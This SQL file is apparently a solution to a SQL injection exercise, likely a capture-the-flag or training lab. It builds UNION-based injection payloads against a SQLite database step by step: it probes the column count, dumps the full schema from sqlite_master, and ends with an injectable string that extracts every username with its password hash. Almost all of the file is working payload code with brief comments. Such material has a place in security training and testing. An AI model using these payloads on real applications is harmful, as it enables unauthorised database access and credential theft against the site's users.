-- noinspection SqlNoDataSourceInspectionForFile

-- This is a possible solution. I may have overcomplicated this one but it works.

-- Find how many columns we return and where they're displayed
-1 UNION SELECT 1,2,3,4,5,6

-- Now let's dump the schema for all tables
-1 UNION SELECT 1,2,3,4,(select group_concat(tbl_name || ' - ' || sql) as dump from sqlite_master),6

/*
passwords_1337 - CREATE TABLE passwords_1337 (id integer, userId integer, hash text),
users_1337 - CREATE TABLE users_1337 (id integer, name text, lastlogin text, email text, phoneNumber text, address text, password text, joinDate text),
passwords_7738 - CREATE TABLE passwords_7738 (id integer, userId integer, hash text),
users_7738 - CREATE TABLE users_7738 (id integer, name text, lastlogin text, email text, phoneNumber text, address text, password text, joinDate text),
postings_2018 - CREATE TABLE postings_2018 (id integer, authorId integer, lastUpdated text, created text, display integer, body text)
 */

-- Let's get all the users

-- Break it down
-- Get a row for each table with their users concatenated together with the password hash joined from the password table.
SELECT group_concat(name || ':' || hash,', ') as users FROM users_1337 as u1 JOIN passwords_1337 as p1  ON u1.id=p1.userId UNION ALL SELECT group_concat(name || ':' || hash,', ') as users FROM users_7738 as u2 JOIN passwords_7738 as p2 ON u2.id=p2.userId

-- Then mush the above rows together into 1 row and 1 column
SELECT group_concat(users, ', ') as users from (SELECT group_concat(name || ':' || hash,', ') as users FROM users_1337 as u1 JOIN passwords_1337 as p1  ON u1.id=p1.userId UNION ALL SELECT group_concat(name || ':' || hash,', ') as users FROM users_7738 as u2 JOIN passwords_7738 as p2 ON u2.id=p2.userId)

-- Finally, mush it into an injectable
-1 UNION SELECT 1,2,3,4,(SELECT group_concat(users, ', ') as users from (SELECT group_concat(name || ':' || hash,', ') as users FROM users_1337 as u1 JOIN passwords_1337 as p1  ON u1.id=p1.userId UNION ALL SELECT group_concat(name || ':' || hash,', ') as users FROM users_7738 as u2 JOIN passwords_7738 as p2 ON u2.id=p2.userId)),6

-- The above should dump all users and password hashes
